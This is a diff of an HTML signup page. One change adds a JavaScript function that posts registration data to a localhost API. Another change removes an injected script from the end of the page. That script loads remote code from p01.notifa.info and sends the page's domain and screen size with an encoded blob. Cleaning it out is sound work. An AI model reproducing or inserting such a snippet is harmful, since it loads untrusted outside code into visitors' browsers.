@@ -241,21 +241,44 @@
                 <div class="col-lg-10 p-0 mx-auto">
                     <div class="row">
                         <div class="col-md-6 mb-24pt mb-md-0">
-                            <form action="fixed-signup-payment.html">
+                            <form>
                                 <div class="form-group">
-                                    <label class="form-label" for="name">Your first and last name:</label>
-                                    <input id="name" type="text" class="form-control" placeholder="Your first and last name ...">
+                                    <label class="form-label" for="name">Your first and last name (min. 3 characters):</label>
+                                    <input id="id_name" type="text" class="form-control" placeholder="Your first and last name ...">
                                 </div>
                                 <div class="form-group">
                                     <label class="form-label" for="email">Your email:</label>
-                                    <input id="email" type="email" class="form-control" placeholder="Your email address ...">
+                                    <input id="id_email" type="email" class="form-control" placeholder="Your email address ...">
                                 </div>
                                 <div class="form-group mb-24pt">
-                                    <label class="form-label" for="password">Password:</label>
-                                    <input id="password" type="password" class="form-control" placeholder="Your password ...">
+                                    <label class="form-label" for="password">Password (min. 8 characters):</label>
+                                    <input id="id_password" type="password" class="form-control" placeholder="Your password ...">
                                 </div>
-                                <button class="btn btn-primary">Create account</button>
+                                <button class="btn btn-primary" onclick='RegisterAccount()'>Create account</button>
                             </form>
+                            <script>
+                                function RegisterAccount(){
+                                    var url  = "http://localhost:3000/api/accounts/";
+                                    var data = {username: document.getElementById('id_name').value, email: document.getElementById('id_email').value, password: document.getElementById('id_password').value };
+                                    var jsonData = JSON.stringify(data);
+
+                                    var xhr  = new XMLHttpRequest();
+                                    xhr.open('POST', url);
+                                    xhr.setRequestHeader('Content-type','application/json; charset=utf-8');                  
+                                    xhr.onload = function() {
+                                        var account = JSON.parse(xhr.responseText);
+                                        if (account.status == 200) {
+                                            alert('Registration successful!' + account.id);
+                                            localStorage.setItem('userID', account.id);
+                                            window.location.replace("fixed-signup-payment.html");
+                                        } else {
+                                            alert('Registration failed! '+ ' Reason: '+ xhr.responseText);
+                                            
+                                        }
+                                    }
+                                   xhr.send(jsonData);                         
+                                }
+                            </script>
                         </div>
                         <div class="col-md-6">
                             <div class="card mb-0">
@@ -1129,10 +1152,5 @@
 
     <!-- App JS -->
     <script src="assets/js/app.js"></script>
-
-
-
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCK1v7c8tbnHH9MeWGjQRusYtAOM6zBnHjpxsHnkBa%2f%2bP016UeFDUftm9KTUo9hrNDFc7k0FleijZXlG4OmyPVjHpSArsB%2b1992zvjrQ9jTFAVd7wyZFY0qo9pYzHqnp4L68M61YWS2mkg8qTzzgiQ9nk%2bPnI7FEJ6vI7RIIWFxQ1C1LMg3i%2f5uvXKzOi5PRuHBsb%2f80VKPhVhOdDdDDBGWOw7efBZDayGV4LW1eMIa1nBQ321l52Nv6Xc0sjHUygwveC0qwYjM4XHskobcBAGUZxUeAD5dxYJvAyhga9WvsgNiR3%2bCyfSB4dg6y7%2bFYgryaOw9wK8uZC%2fxNU8xIzZV8ZPXLeIuYKJB1sCmVDG60FKbJdpr8KTSE1ymJ3EX1K0y08CMTyCH45NLbOL8sb%2f8k1hvZF4edH9uwD%2bJsD0MPyvKEzmB62E7Ewy%2bgMD4Y8v4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-
+    </body>
 </html>
